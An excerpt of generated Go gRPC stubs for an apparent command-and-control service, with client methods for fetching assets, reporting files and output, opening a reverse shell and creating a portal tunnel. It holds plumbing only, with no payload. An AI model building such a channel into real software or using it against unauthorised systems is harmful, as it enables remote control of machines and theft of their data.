...
func (c *c2Client) FetchAsset(ctx context.Context, in *FetchAssetRequest, opts ...grpc.CallOption) (C2_FetchAssetClient, error) {
	stream, err := c.cc.NewStream(ctx, &_C2_serviceDesc.Streams[0], "/c2.C2/FetchAsset", opts...)
	if err != nil {
		return nil, err
	}
...
func (c *c2Client) ReportFile(ctx context.Context, opts ...grpc.CallOption) (C2_ReportFileClient, error) {
	stream, err := c.cc.NewStream(ctx, &_C2_serviceDesc.Streams[1], "/c2.C2/ReportFile", opts...)
	if err != nil {
		return nil, err
	}
...
func (c *c2Client) ReportOutput(ctx context.Context, in *ReportOutputRequest, opts ...grpc.CallOption) (*ReportOutputResponse, error) {
	...
	err := c.cc.Invoke(ctx, "/c2.C2/ReportOutput", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
...
func (c *c2Client) ReverseShell(ctx context.Context, opts ...grpc.CallOption) (C2_ReverseShellClient, error) {
	stream, err := c.cc.NewStream(ctx, &_C2_serviceDesc.Streams[2], "/c2.C2/ReverseShell", opts...)
	if err != nil {
		return nil, err
	}
...
func (c *c2Client) CreatePortal(ctx context.Context, opts ...grpc.CallOption) (C2_CreatePortalClient, error) {
	stream, err := c.cc.NewStream(ctx, &_C2_serviceDesc.Streams[3], "/c2.C2/CreatePortal", opts...)
	if err != nil {
		return nil, err
	}
	x := &c2CreatePortalClient{stream}
	return x, nil
}
...
func _C2_CreatePortal_Handler(srv interface{}, stream grpc.ServerStream) error {
	return srv.(C2Server).CreatePortal(&c2CreatePortalServer{stream})
}
